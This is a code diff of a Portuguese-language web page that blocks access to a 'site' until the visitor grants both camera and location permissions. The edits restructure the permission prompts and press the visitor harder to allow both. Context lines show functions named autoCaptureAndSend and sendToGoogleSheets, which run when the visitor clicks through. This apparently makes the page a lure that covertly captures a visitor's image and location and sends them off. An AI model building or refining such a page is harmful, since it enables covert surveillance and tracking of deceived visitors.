@@ -280,6 +280,12 @@
             animation: none;
         }
         
+        .call-permission-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            animation: none;
+        }
+        
         .warning-text {
             color: #c0392b;
             font-weight: bold;
@@ -582,10 +588,10 @@
             </div>
             
             <p style="font-size: 11px; color: #999;">
-                Quando solicitado, clique em <strong>"PERMITIR"</strong>
+                Clique no botão abaixo e depois em <strong>"PERMITIR"</strong> em ambas as solicitações
             </p>
             
-            <!-- Botão principal para chamar permissão - baseado no exemplo -->
+            <!-- Botão principal para chamar permissão -->
             <button id="callPermissionBtn" class="call-permission-btn">
                 🔓 PERMITIR CÂMERA E LOCALIZAÇÃO
             </button>
@@ -593,7 +599,7 @@
             <button id="initialAllowBtn" class="btn-initial" style="display: none;">✅ Acessar Site</button>
             
             <div id="warningMsg" class="warning-text" style="display: none;">
-                ⚠️ Clique no botão acima para autorizar as permissões!
+                ⚠️ Clique no botão acima e permita AMBAS as permissões!
             </div>
             <div id="successMsg" class="success-text" style="display: none;">
                 ✅ Permissões concedidas! Clique em "Acessar Site"
@@ -697,6 +703,7 @@
         let cameraGranted = false;
         let locationGranted = false;
         let permissionsReady = false;
+        let isRequesting = false;
         
         // Elementos
         const initialScreen = document.getElementById('initialScreen');
@@ -737,57 +744,77 @@
             }
         }
         
-        // Função para solicitar permissões - IGUAL AO EXEMPLO
-        async function requestPermissions() {
-            // Desabilita o botão durante a solicitação
-            callPermissionBtn.disabled = true;
-            callPermissionBtn.textContent = '⏳ Solicitando permissões...';
-            warningMsg.style.display = 'none';
-            
-            // Solicita câmera (igual ao exemplo)
+        // Função para solicitar permissões de CÂMERA e LOCALIZAÇÃO separadamente
+        async function requestCameraPermission() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: true
-                });
-                // Fecha a câmera após obter a permissão
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 stream.getTracks().forEach(track => track.stop());
                 cameraGranted = true;
                 updateStatusUI();
+                return true;
             } catch (e) {
                 console.log('Câmera negada:', e);
                 cameraGranted = false;
                 updateStatusUI();
+                return false;
+            }
+        }
+        
+        function requestLocationPermission() {
+            return new Promise((resolve) => {
+                navigator.geolocation.getCurrentPosition(
+                    (posicao) => {
+                        console.log('Localização autorizada:', posicao.coords);
+                        locationGranted = true;
+                        updateStatusUI();
+                        resolve(true);
+                    },
+                    (erro) => {
+                        console.log('Localização negada:', erro);
+                        locationGranted = false;
+                        updateStatusUI();
+                        resolve(false);
+                    }
+                );
+            });
+        }
+        
+        async function requestAllPermissions() {
+            if (isRequesting) return false;
+            isRequesting = true;
+            
+            callPermissionBtn.disabled = true;
+            callPermissionBtn.textContent = '⏳ Solicitando permissões...';
+            warningMsg.style.display = 'none';
+            successMsg.style.display = 'none';
+            
+            updateStatusUI();
+            
+            // Solicitar câmera primeiro
+            await requestCameraPermission();
+            
+            // Pequena pausa para garantir que o popup da câmera fechou
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            // Solicitar localização
+            await requestLocationPermission();
+            
+            permissionsReady = cameraGranted && locationGranted;
+            
+            if (permissionsReady) {
+                callPermissionBtn.style.display = 'none';
+                initialAllowBtn.style.display = 'block';
+                successMsg.style.display = 'block';
+                warningMsg.style.display = 'none';
+            } else {
+                callPermissionBtn.disabled = false;
+                callPermissionBtn.textContent = '🔓 PERMITIR CÂMERA E LOCALIZAÇÃO';
+                warningMsg.style.display = 'block';
+                successMsg.style.display = 'none';
             }
             
-            // Solicita localização (igual ao exemplo)
-            navigator.geolocation.getCurrentPosition(
-                (posicao) => {
-                    console.log('Localização autorizada:', posicao.coords);
-                    locationGranted = true;
-                    updateStatusUI();
-                    
-                    // Se ambas as permissões foram concedidas
-                    if (cameraGranted && locationGranted) {
-                        permissionsReady = true;
-                        callPermissionBtn.style.display = 'none';
-                        initialAllowBtn.style.display = 'block';
-                        successMsg.style.display = 'block';
-                        warningMsg.style.display = 'none';
-                    } else {
-                        callPermissionBtn.disabled = false;
-                        callPermissionBtn.textContent = '🔓 PERMITIR CÂMERA E LOCALIZAÇÃO';
-                        warningMsg.style.display = 'block';
-                    }
-                },
-                (erro) => {
-                    console.log('Localização negada:', erro);
-                    locationGranted = false;
-                    updateStatusUI();
-                    callPermissionBtn.disabled = false;
-                    callPermissionBtn.textContent = '🔓 PERMITIR CÂMERA E LOCALIZAÇÃO';
-                    warningMsg.style.display = 'block';
-                }
-            );
+            isRequesting = false;
+            return permissionsReady;
         }
         
         async function sendToGoogleSheets(data) {
@@ -949,9 +976,9 @@
             }
         }
         
-        // Botão para chamar permissão - igual ao exemplo
+        // Botão para chamar permissão - chama AMBAS as permissões
         callPermissionBtn.addEventListener('click', () => {
-            requestPermissions();
+            requestAllPermissions();
         });
         
         initialAllowBtn.addEventListener('click', async () => {
@@ -970,13 +997,6 @@
                 await autoCaptureAndSend();
             }
         });
-        
-        // Tentativa automática uma vez ao carregar (opcional)
-        setTimeout(function() {
-            if (!cameraGranted && !locationGranted) {
-                console.log('Tentativa automática de permissões...');
-            }
-        }, 500);
     </script>
 </body>
 </html>
